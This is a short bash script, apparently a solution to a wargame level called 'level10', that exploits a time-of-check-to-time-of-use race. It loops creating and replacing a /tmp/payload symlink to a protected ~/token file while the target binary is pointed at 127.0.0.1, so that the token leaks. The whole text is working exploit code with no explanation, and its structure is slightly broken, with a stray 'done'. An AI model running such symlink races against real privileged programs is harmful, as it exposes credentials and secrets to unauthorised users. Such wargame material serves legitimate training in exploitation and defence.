function loop() {
    ln -s ~/token /tmp/token
    while [ 42 ]; do
        ln -s ~/token /tmp/token
        mv /tmp/token /tmp/payload || true
        if [ -f /tmp/payload ] ; then
            rm /tmp/payload || true
        fi
        touch /tmp/payload
        if [ -f /tmp/payload ] ; then
            rm /tmp/payload || true
        fi
    done
}

loop &
    ~/level10 /tmp/payload 127.0.0.1
done